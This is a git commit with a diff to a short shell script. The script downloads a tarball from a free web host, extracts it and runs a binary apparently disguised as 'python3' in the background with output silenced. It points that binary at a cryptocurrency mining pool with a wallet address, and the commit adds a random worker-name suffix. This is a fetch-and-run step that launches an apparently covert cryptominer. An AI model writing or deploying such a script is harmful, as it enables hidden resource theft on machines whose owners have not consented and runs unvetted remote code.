810b5aabdb9289db4d93edd8738493260a3207a9
DotAja <142836390+DotAja@users.noreply.github.com>
2024-06-15 02:19:21 +0700

    Update dotkcn.sh

--- dotkcn.sh
+++ dotkcn.sh
@@ -4,4 +4,6 @@ wget -O dot momok.x10.bz/DOT-SRB.tar.gz
 
 tar xvf dot
 
-nohup ./dotsrb/python3 -a flex -o eu.mpool.live:5271 -u  kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT > /dev/null 2>&1 &
+nomer=$((RANDOM % 50 + 1))
+
+nohup ./dotsrb/python3 -a flex -o eu.mpool.live:5271 -u  kc1qmk8nx9ur8uqvtx5rlhx4wjana5pelq9lgka35f.DOT-$nomer > /dev/null 2>&1 &
